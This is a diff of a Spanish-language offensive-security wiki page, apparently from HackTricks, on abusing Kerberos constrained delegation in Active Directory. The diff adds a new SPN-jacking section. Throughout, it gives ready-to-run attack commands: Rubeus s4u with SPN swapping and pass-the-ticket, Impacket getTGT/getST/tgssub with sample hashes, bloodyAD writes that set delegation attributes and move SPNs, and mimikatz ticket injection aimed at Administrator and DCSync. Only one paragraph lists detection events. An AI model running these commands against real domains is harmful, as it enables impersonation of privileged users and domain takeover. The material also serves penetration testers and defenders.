@@ -4,18 +4,18 @@
 
 ## Constrained Delegation
 
-Con esto, un administrador de dominio puede **permitir** que un equipo **suplante a un usuario o equipo** contra cualquier **servicio** de una máquina.
+Usando esto, un **Domain admin** puede **permitir** que un equipo **suplante a un usuario o equipo** contra cualquier **servicio** de una máquina.
 
-- **Service for User to self (_S4U2self_):** Cualquier **cuenta de servicio que posea un SPN** normalmente puede obtener un TGS para sí misma en nombre de un usuario arbitrario. Si la cuenta también tiene [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) en _userAccountControl_, ese TGS es **forwardable**, lo que hace que la protocol transition sea directamente útil para la **constrained delegation clásica**.
-- **Service for User to Proxy(_S4U2proxy_):** Una **cuenta de servicio** puede obtener un TGS en nombre de un usuario para los SPN incluidos en **msDS-AllowedToDelegateTo**. El evidence ticket utilizado en S4U2Proxy debe ser un ticket **forwardable** para el servicio que realiza la delegación: ya sea un ticket real de cliente a servicio capturado de la víctima o uno generado con **S4U2Self + T2A4D**.
+- **Service for User to self (_S4U2self_):** Cualquier **service account que posea un SPN** normalmente puede obtener un TGS para sí misma en nombre de un usuario arbitrario. Si la cuenta también tiene [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) en _userAccountControl_, ese TGS es **forwardable**, que es lo que hace que protocol transition sea directamente útil para la **classic constrained delegation**.
+- **Service for User to Proxy(_S4U2proxy_):** Una **service account** puede obtener un TGS en nombre de un usuario para los SPN indicados en **msDS-AllowedToDelegateTo**. El evidence ticket usado en S4U2Proxy debe ser un ticket **forwardable** para el servicio que realiza la delegación: puede ser un ticket real de cliente a servicio capturado de la víctima o uno generado con **S4U2Self + T2A4D**.
 
-**Nota**: Si un usuario está marcado como ‘_Account is sensitive and cannot be delegated_’ en AD, o es miembro de **Protected Users**, normalmente **no podrás suplantarlo** mediante constrained delegation. En dominios modernos, prioriza material **AES** frente a suposiciones basadas únicamente en RC4 al atacar cuentas con delegación habilitada.
+**Nota**: Si un usuario está marcado como ‘_Account is sensitive and cannot be delegated_’ en AD, o es miembro de **Protected Users**, normalmente **no podrás suplantarlo** mediante constrained delegation. En dominios modernos, da preferencia al material **AES** en lugar de asumir que solo está disponible RC4 al atacar cuentas con delegation habilitada.
 
 Esto significa que, si **comprometes el hash del servicio**, puedes **suplantar usuarios** y obtener **acceso** en su nombre a cualquier **servicio** en las máquinas indicadas (posible **privesc**).
 
-Además, **no solo tendrás acceso al servicio que el usuario puede suplantar, sino también a cualquier servicio**, porque el SPN (el nombre del servicio solicitado) no se comprueba (en el ticket, esta parte no está cifrada ni firmada). Por lo tanto, si tienes acceso al **servicio CIFS**, también puedes tener acceso al **servicio HOST** utilizando, por ejemplo, el flag `/altservice` de Rubeus. La misma debilidad de intercambio de SPN es aprovechada por **Impacket getST -altservice** y otras herramientas.
+Además, **no solo tendrás acceso al servicio que el usuario puede suplantar, sino también a cualquier servicio**, porque el SPN (el nombre del servicio solicitado) no se comprueba (en el ticket, esta parte no está cifrada ni firmada). Por tanto, si tienes acceso al **servicio CIFS**, también puedes tener acceso al **servicio HOST** usando, por ejemplo, el flag `/altservice` en Rubeus. La misma debilidad de intercambio de SPN es aprovechada por **Impacket getST -altservice** y otras herramientas.
 
-Además, el acceso al **servicio LDAP en un DC** es lo necesario para explotar un **DCSync**.
+Además, el **acceso al servicio LDAP en el DC** es lo necesario para explotar un **DCSync**.
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -33,29 +33,29 @@ nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation
 bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
 bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
 ```
-**Nota del operador:** no confíes únicamente en las capturas de pantalla de **ADUC** o BloodHound para revisar **gMSA/sMSA**. Esas cuentas suelen ocultar la pestaña habitual **Delegation**, así que enumera directamente los atributos sin procesar **`userAccountControl`** y **`msDS-AllowedToDelegateTo`**.
+**Nota del operador:** no confíes únicamente en las capturas de **ADUC** o BloodHound para revisar **gMSA/sMSA**. Esas cuentas suelen ocultar la pestaña habitual de Delegation, así que enumera directamente los atributos sin procesar **`userAccountControl`** y **`msDS-AllowedToDelegateTo`**.
 ```bash:Quick Way
 # Generate TGT + TGS impersonating a user knowing the hash
 Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
 ```
-### Transición de protocolo frente a delegación restringida solo Kerberos
+### Delegación restringida con transición de protocolo frente a solo Kerberos
 
 Si la cuenta comprometida tiene **T2A4D**, normalmente puedes completar toda la cadena **`S4U2Self -> S4U2Proxy`** usando únicamente la clave del servicio/TGT.<sup>[[2]](#references)</sup>
 
-Si solo tiene **`msDS-AllowedToDelegateTo`** (el modo clásico **"Use Kerberos only"**), la delegación aún puede abusarse, pero el ticket de evidencia para S4U2Proxy debe ser un **ticket real y forwardable de usuario a servicio** para el servicio delegante. En la práctica, esto significa robar o capturar un TGS de la víctima desde **LSASS/ccache** y pasarlo a la segunda fase (`/tgs:` en Rubeus). Un ticket S4U2Self **non-forwardable** no es suficiente para la delegación restringida clásica; si ese es tu único ticket de evidencia, consulta [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>
+Si solo tiene **`msDS-AllowedToDelegateTo`** (el modo clásico **"Use Kerberos only"**), la delegación aún puede abusarse, pero el ticket de evidencia para S4U2Proxy debe ser un **ticket real y reenviable de usuario a servicio** para el servicio delegante. En la práctica, esto significa robar o capturar un TGS de la víctima desde **LSASS/ccache** e introducirlo en la segunda fase (`/tgs:` en Rubeus). Un ticket S4U2Self **no reenviable** **no** es suficiente para la delegación restringida clásica; si ese es tu único ticket de evidencia, consulta [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>
 
 ### Notas sobre la delegación restringida entre dominios (2025+)
 
-Desde **Windows Server 2012/2012 R2**, el KDC admite la delegación restringida entre dominios/forests mediante extensiones de S4U2Proxy. Las versiones modernas (Windows Server 2016–2025) mantienen este comportamiento y añaden dos SIDs de PAC para indicar la transición de protocolo:<sup>[[1]](#references)</sup>
+Desde **Windows Server 2012/2012 R2**, el KDC admite la delegación restringida entre dominios/bosques mediante extensiones S4U2Proxy. Las versiones modernas (Windows Server 2016–2025) mantienen este comportamiento y añaden dos SID de PAC para indicar la transición de protocolo:<sup>[[1]](#references)</sup>
 
 - `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) cuando el usuario se autenticó normalmente.
 - `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) cuando un servicio afirmó la identidad mediante la transición de protocolo.
 
 Espera encontrar `SERVICE_ASSERTED_IDENTITY` dentro del PAC cuando se utiliza la transición de protocolo entre dominios, lo que confirma que el paso S4U2Proxy se completó correctamente.<sup>[[1]](#references)</sup>
 
-### Herramientas de Impacket / Linux (altservice y full S4U)
+### Impacket / herramientas de Linux (altservice y S4U completo)
 
-Las versiones recientes de Impacket (0.11.x+) exponen la misma cadena S4U y el cambio de SPN que Rubeus:<sup>[[2]](#references)</sup>
+Las versiones recientes de Impacket (0.11.x+) exponen la misma cadena S4U y el intercambio de SPN que Rubeus:<sup>[[2]](#references)</sup>
 ```bash
 # Get TGT for delegating service (hash/aes)
 getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d
@@ -74,17 +74,43 @@ smbclient -k //dc.contoso.local/C$ -c 'dir'
 tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
 export KRB5CCNAME=Administrator_HOST.ccache
 ```
-Si prefieres falsificar primero el ST del usuario (p. ej., solo con un hash offline), combina **ticketer.py** con **getST.py** para S4U2Proxy. **tgssub.py** también resulta útil cuando ya tienes un ccache funcional y solo necesitas cambiar la clase de servicio para el mismo host. Consulta el issue abierto de Impacket #1713 para conocer las peculiaridades actuales (KRB_AP_ERR_MODIFIED cuando el ST falsificado no coincide con la clave del SPN).<sup>[[2]](#references)</sup>
+Si prefieres forjar primero el user ST (por ejemplo, usando únicamente el hash offline), combina **ticketer.py** con **getST.py** para S4U2Proxy. `tgssub.py` también resulta útil cuando ya tienes un ccache funcional y solo necesitas cambiar la service class para el mismo host. Consulta el issue #1713 de Impacket para conocer los problemas actuales (KRB_AP_ERR_MODIFIED cuando el ST forjado no coincide con la clave del SPN).<sup>[[2]](#references)</sup>
 
-### Automatización de la configuración de delegación desde credenciales con pocos privilegios
+### SPN-jacking: redirigir un objetivo de constrained delegation
 
-Si ya tienes **GenericAll/WriteDACL** sobre un equipo o una cuenta de servicio, puedes establecer remotamente los atributos necesarios sin RSAT usando **bloodyAD** (2024+):
+La constrained delegation clásica autoriza un **string de SPN** en `msDS-AllowedToDelegateTo`, no un SID de destino inmutable. Durante S4U2Proxy, el KDC resuelve la cuenta que actualmente posee ese SPN y cifra el service ticket con la long-term key de dicha cuenta. Por lo tanto, controlar la cuenta delegante junto con `WriteSPN` sobre otra cuenta de servicio/equipo permite redirigir una restricción de delegación sin `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>
+
+Existen dos variantes:<sup>[[5]](#references)</sup>
+
+- **Ghost SPN-jacking:** el SPN permitido está huérfano porque su propietario anterior fue eliminado, renombrado o se le eliminó el SPN. Añádelo directamente a la cuenta de destino deseada.
+- **Live SPN-jacking:** el SPN todavía pertenece a una cuenta de origen. La validación de SPN duplicados normalmente bloquea la escritura en el destino, por lo que se necesita `WriteSPN` sobre ambos objetos: elimínalo del origen, añádelo al destino, obtén el ticket y restaura el registro original.
+
+El siguiente flujo abstracto en Linux mueve un SPN permitido, ejecuta S4U como el principal delegante comprometido y reescribe el nombre de servicio del ticket para utilizar un servicio útil en el nuevo destino.<sup>[[5]](#references)[[6]](#references)</sup>
+```bash
+# Omit this deletion for a ghost SPN
+bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
+msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"
+
+bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
+msldap addspn "$TARGET_DN" "$DELEGATED_SPN"
+
+getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
+-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
+"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
+```
+`-altservice` es la segunda primitiva independiente. El ticket S4U2Proxy se cifró para la cuenta que ahora posee `$DELEGATED_SPN`; dado que el nombre del servicio del ticket (`sname`) está fuera del cuerpo cifrado del ticket, las herramientas pueden sustituirlo por otra clase de servicio/nombre de host cuyo servicio utilice esa misma clave de cuenta. El SPN-jacking cambia primero **qué clave de cuenta** protege el ticket, mientras que la sustitución de la clase de servicio cambia **dónde se presenta ese ticket**.<sup>[[5]](#references)[[6]](#references)</sup>
+
+Para realizar live jacking, revierte las dos escrituras LDAP inmediatamente después de adquirir el ticket para evitar interrumpir el servicio legítimo. En los DC con auditoría de cuentas de equipo habilitada, busca el evento de Security **4742**, donde `servicePrincipalName` se elimine de un equipo y se añada poco después a otro, especialmente cuando el nombre de host del SPN difiera de `dNSHostName` del destino. Correlaciónalo con el evento **4769**: S4U2Self presenta la misma cuenta como cliente/servicio, mientras que S4U2Proxy rellena **Transited Services**.<sup>[[5]](#references)</sup>
+
+### Automatización de la configuración de delegation con credenciales de bajos privilegios
+
+Si ya tienes **GenericAll/WriteDACL** sobre un equipo o una cuenta de servicio, puedes establecer remotamente los atributos necesarios sin RSAT mediante **bloodyAD** (2024+):
 ```bash
 # Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
 ```
-Esto permite construir una ruta de constrained delegation para privesc sin privilegios de DA en cuanto puedas escribir esos atributos.
+Esto te permite crear una ruta de constrained delegation para privesc sin privilegios de DA en cuanto puedas escribir esos atributos.
 
 - Paso 1: **Obtener el TGT del servicio permitido**
 ```bash:Get TGT
@@ -106,11 +132,11 @@ tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
 > [!WARNING]
-> Hay **otras formas de obtener un ticket TGT** o el **RC4** o **AES256** sin ser SYSTEM en el equipo, como Printer Bug y unconstrain delegation, NTLM relaying y Active Directory Certificate Service abuse
+> Hay **otras formas de obtener un ticket TGT**, o el **RC4** o **AES256**, sin ser SYSTEM en el equipo, como Printer Bug y unconstrained delegation, NTLM relaying y el abuso de Active Directory Certificate Service.
 >
 > **Con solo tener ese ticket TGT (o su hash), puedes realizar este ataque sin comprometer todo el equipo.**
 
-- Step2: **Obtener el TGS para el servicio suplantando al usuario**
+- Paso 2: **Obtener el TGS para el servicio suplantando al usuario**
 ```bash:Using Rubeus
 # Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -142,8 +168,10 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 
 ## References
 
-- [1] [Descripción general de Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
-- [2] [Abusing Delegation with Impacket (Part 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
-- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
-- [4] [Kerberosity Killed the Domain: An Offensive Kerberos Overview (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+- [1] [Descripción general de la delegación restringida de Kerberos (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
+- [2] [Abusando de la delegación con Impacket (Parte 2): delegación restringida (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
+- [3] [Delegación restringida de Kerberos (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+- [4] [Kerberosity acabó con el dominio: una descripción general ofensiva de Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
+- [5] [Elad Shamir - SPN-jacking: un caso excepcional en WriteSPN Abuse](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
+- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
 {{#include ../../banners/hacktricks-training.md}}
